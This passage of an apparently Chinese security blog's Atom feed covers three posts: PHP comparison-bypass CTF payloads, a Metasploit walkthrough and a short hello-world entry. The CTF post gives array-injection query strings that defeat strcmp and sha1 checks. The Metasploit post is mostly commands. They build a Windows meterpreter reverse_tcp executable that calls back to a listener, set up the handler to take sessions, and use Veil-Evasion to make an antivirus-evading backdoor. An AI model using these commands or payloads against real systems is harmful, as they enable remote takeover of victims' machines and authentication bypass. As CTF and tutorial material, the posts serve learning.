&#123;</div><div class="line"><span class="keyword">print</span> <span class="string">"Welcome!"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="keyword">print</span> <span class="string">"Bad key!"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>payload:<br><code>?key[]=1</code></p><p>var_dump(strcmp( ‘’, array())) =&gt; NULL ⇒ NULL == 0 ⇒ Get Flag！</p><h2 id="关于“-”的绕过："><a href="#关于“-”的绕过：" class="headerlink" title="关于“===”的绕过："></a>关于“===”的绕过：</h2><p>利用数组绕过</p><p>一道简单的CTF题目：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</div><div class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">'Your password can not be your name.'</span>;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</div><div class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</div></pre></td></tr></table></figure></p><p>payload:<br><code>?name[]=1&amp;password[]=2</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;比较运算符”-”与”-”的学习：&quot;&gt;&lt;a href=&quot;#比较运算符”-”与”-”的学习：&quot; class=&quot;headerlink&quot; title=&quot;比较运算符”==”与”===”的学习：&quot;&gt;&lt;/a&gt;比较运算符”==”与”===”的学习：&lt;/h1&gt;&lt;h2 id=&quot;关于”
      
    
    </summary>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>msf 初体验</title>
    <link href="http://yoursite.com/2017/02/06/msf%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://yoursite.com/2017/02/06/msf初体验/</id>
    <published>2017-02-06T13:27:46.603Z</published>
    <updated>2017-02-06T14:06:16.568Z</updated>
    
    <content type="html"><![CDATA[<h1 id="msf简单使用：-以windows-meterpreter-reverse-tcp为例"><a href="#msf简单使用：-以windows-meterpreter-reverse-tcp为例" class="headerlink" title="msf简单使用：(以windows/meterpreter/reverse_tcp为例)"></a>msf简单使用：(以windows/meterpreter/reverse_tcp为例)</h1><h2 id="1-payload设置："><a href="#1-payload设置：" class="headerlink" title="1.payload设置："></a>1.payload设置：</h2><p>新开终端<br><code>msfvenom -l</code><br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件</code></p><h2 id="2-监听："><a href="#2-监听：" class="headerlink" title="2.监听："></a>2.监听：</h2><p>进入metasploit<br><code>use exploit/multi/handler</code><br><code>show options</code></p><h2 id="3-插入攻击荷载"><a href="#3-插入攻击荷载" class="headerlink" title="3.插入攻击荷载"></a>3.插入攻击荷载</h2><p>show payloads<br><code>set payload windows/meterpreter_reverse_tcp</code><br>再次show options(出现LHOST和LPORT选项)<br><code>set lhost 192.168.1.120</code><br><code>set lport 4444</code></p><h2 id="4-使用run-或者-exploit-启动攻击"><a href="#4-使用run-或者-exploit-启动攻击" class="headerlink" title="4.使用run 或者 exploit 启动攻击"></a>4.使用run 或者 exploit 启动攻击</h2><p>等待被攻击主机中招，即可拿到session<br>使用jobs停止攻击<br><code>sessions -l  //获取session列表</code><br><code>sessions -i 1 //进入meterpreter</code></p><p>==============================</p><h1 id="PS"><a href="#PS" class="headerlink" title="PS:"></a>PS:</h1><h2 id="使用veil-veasion生成后门："><a href="#使用veil-veasion生成后门：" class="headerlink" title="使用veil-veasion生成后门："></a>使用veil-veasion生成后门：</h2><p>打开终端<br><code>veil-veasion</code><br><code>list</code><br><code>use 6 //以c为例</code></p><p>生成的后台地址：<br><code>/var/lib/veil-evasion/output/compiled/payload.exe</code></p><p>在msf中使用：<br><code>msfconsole -r /var/lib/veil-evasion/output/handlers/payload_handler.rc</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;msf简单使用：-以windows-meterpreter-reverse-tcp为例&quot;&gt;&lt;a href=&quot;#msf简单使用：-以windows-meterpreter-reverse-tcp为例&quot; class=&quot;headerlink&quot; title=&quot;msf简单使
      
    
    </summary>
    
    
      <category term="metasploit" scheme="http://yoursite.com/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2017/01/14/hello%20world/"/>
    <id>http://yoursite.com/2017/01/14/hello world/</id>
    <published>2017-01-14T08:17:05.298Z</published>
    <updated>2017-01-17T12:28:13.070Z</updated>
    
    <content type="html"><![CDATA[<p>寒假宅在家里无聊搭了这个博客,以后有空会在上面分享一些东西吧。</p><p>随便写写说的好像有人会来看的样子。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;寒假宅在家里无聊搭了这个博客,以后有空会在上面分享一些东西吧。&lt;/p&gt;
&lt;p&gt;随便写写说的好像有人会来看的样子。。。&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
</feed>
